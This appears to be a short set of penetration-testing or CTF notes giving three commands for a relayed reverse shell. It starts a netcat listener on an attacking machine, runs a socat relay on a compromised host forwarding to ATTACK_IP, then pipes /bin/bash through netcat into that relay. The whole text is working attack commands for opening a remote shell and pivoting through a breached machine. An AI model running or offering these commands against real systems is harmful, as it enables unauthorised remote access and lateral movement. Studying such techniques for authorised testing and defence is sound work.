1. Start nc listening on attacking box `sudo nc -lvnp 443`
2. Start the relay on the compromised box `./socat tcp-l:8000 tcp:ATTACK_IP:443 &`
3. Create reverse shell to newly opened port 8000 on compromised box `nc 127.0.0.1 8000 -e /bin/bash`
